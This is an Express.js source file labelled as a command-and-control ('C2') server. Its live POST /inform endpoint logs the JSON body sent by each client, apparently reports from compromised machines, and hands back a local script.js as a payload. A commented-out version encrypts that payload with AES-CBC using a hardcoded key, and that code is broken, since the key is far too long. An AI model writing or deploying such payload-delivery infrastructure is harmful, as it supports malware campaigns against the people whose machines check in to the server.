const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const port = 8000;

app.use(express.json());

// Endpoint to handle informResponse
// app.post('/inform', (req, res) => {
//   try {
//     // Read the script.js file as a buffer
//     const scriptPath = path.join(__dirname, 'script.js');
//     const scriptBuffer = fs.readFileSync(scriptPath);

//     // Encrypt the script buffer using a symmetric key
//     const encryptionKey = '59c8734fa19575849ff62b951454180d89deee9b545322aba1a3c0151c8cbde206b435efbd0ad0cafd5472435939ee68979cb96420f0354aecf929a2e76d39a361899f6f3029444ff0d60666472f59560c53a1df05c8f7c467fb0f330bfc511dcddabb1fe9b33f2377a7a89ae9cdfdf33875a8ca848f424608be6383998e1ba342ff4ac6acb7f939336c8da9d7e5827fd231135d98d90393e07a7664c18bba08aa13e7e0c730fa715d8d0ec50bebb93232e970f5cd9e063c651a77f628dc64d8f505d58b92c2ea05f0c89f184a01a0b3fb52182563fb305034a5fbf7c81bec4f64ad72d2775674f4e6f5851615a98f3aca64b2d08103f095f64478c7c004c896'; // Replace with your encryption key
//     const iv = crypto.randomBytes(16);
//     const cipher = crypto.createCipheriv('aes-256-cbc', encryptionKey, iv);
//     const encryptedBuffer = Buffer.concat([cipher.update(scriptBuffer), cipher.final()]);

//     // Return the encrypted buffer along with the IV as the response
//     const response = {
//       iv: iv.toString('base64'),
//       encryptedBuffer: encryptedBuffer.toString('base64')
//     };
//     res.json(response);
//   } catch (err) {
//     console.error('Error while reading or encrypting the script file:', err);
//     res.status(500).send('Internal Server Error');
//   }
// });



// Endpoint to handle informResponse
app.post('/inform', (req, res) => {
  try {
    console.log(JSON.stringify(req.body));
    // Read the script.js file as a buffer
    const scriptPath = path.join(__dirname, 'script.js');
    const scriptBuffer = fs.readFileSync(scriptPath);

    // Return the script buffer as the response
    res.send(scriptBuffer);
  } catch (err) {
    console.error('Error while reading the script file:', err);
    res.status(500).send('Internal Server Error');
  }
});

// Start the server
app.listen(port, () => {
  console.log(`C2 server is running on http://localhost:${port}`);
});
